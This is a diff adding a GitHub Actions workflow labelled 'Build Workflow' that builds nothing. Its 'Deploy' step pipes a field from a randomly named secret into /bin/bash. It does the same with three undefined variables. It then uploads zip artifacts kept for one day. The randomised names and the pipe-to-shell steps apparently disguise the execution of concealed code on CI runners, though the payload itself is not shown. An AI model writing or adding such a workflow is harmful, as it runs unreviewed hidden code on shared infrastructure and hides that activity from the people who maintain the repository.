@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  dispatcher:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          yq45727: ${{ secrets.yq45727 }}
+        run: |
+          printf '%s' "$yq45727" | jq -r .enq716 | /bin/bash
+          printf '%s' "$fwab1" | jq -r .ybzt2863 | /bin/bash
+          echo $q1 | jq -r .pwl73642 | /bin/bash
+          printf '%s' "$bc2" | jq -r .llhb195 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1j8haIlv
+          path: "*.zip"
+          retention-days: 1
